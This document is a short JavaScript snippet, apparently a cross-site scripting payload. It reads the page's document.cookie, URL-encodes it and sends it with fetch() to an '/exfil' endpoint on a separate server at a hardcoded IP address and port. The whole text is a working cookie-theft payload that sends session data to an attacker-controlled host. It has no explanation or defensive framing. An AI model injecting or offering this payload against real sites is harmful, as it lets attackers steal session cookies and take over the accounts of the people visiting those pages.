const SERVER = '192.168.45.159';
const PORT = '8081';

const cookie = document.cookie;
const encodedCookie = encodeURIComponent(cookie);

fetch(`http://${SERVER}:${PORT}/exfil?data=${encodedCookie}`);
